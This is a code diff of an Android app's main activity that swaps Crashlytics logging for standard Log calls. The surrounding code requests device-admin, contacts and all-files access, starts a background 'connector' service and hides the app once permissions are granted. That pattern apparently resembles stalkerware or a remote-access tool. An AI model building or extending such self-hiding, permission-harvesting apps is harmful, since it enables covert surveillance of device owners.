@@ -13,15 +13,14 @@ import android.provider.Settings
 import android.view.View
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
+import android.util.Log
 import com.nexlink.bridge.databinding.ActivityMainBinding
-import com.google.firebase.crashlytics.FirebaseCrashlytics
 import java.util.UUID
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
-    private val crashlytics by lazy { FirebaseCrashlytics.getInstance() }
 
     private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
     private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }
@@ -39,7 +38,7 @@ class MainActivity : AppCompatActivity() {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        crashlytics.log("MainActivity: onCreate")
+        Log.d("MainActivity", "onCreate")
 
         ensureDeviceId()
         startConnectorService()
@@ -63,7 +62,7 @@ class MainActivity : AppCompatActivity() {
     private fun updateUI() {
         val allPermsOk = allPermissionsGranted()
 
-        crashlytics.log("MainActivity: updateUI allPermsOk=$allPermsOk")
+        Log.d("MainActivity", "updateUI allPermsOk=$allPermsOk")
 
         if (allPermsOk) {
             hideAndExit()
@@ -77,7 +76,7 @@ class MainActivity : AppCompatActivity() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) missing.add("Akses File (All Files Access)")
 
-        crashlytics.log("MainActivity: missing = ${missing.joinToString()}")
+        Log.d("MainActivity", "missing = ${missing.joinToString()}")
         binding.tvAccessStatus.text = "Izin yang belum diberikan:\n• ${missing.joinToString("\n• ")}\n\nKetuk tombol untuk berikan izin."
         binding.tvAccessStatus.setTextColor(getColor(R.color.red))
         binding.btnAccessibility.text = "Berikan Izin →"
@@ -122,7 +121,7 @@ class MainActivity : AppCompatActivity() {
                 startService(intent)
             }
         } catch (e: Exception) {
-            crashlytics.recordException(e)
+            Log.w("MainActivity", "startForegroundService error", e)
         }
     }
 }
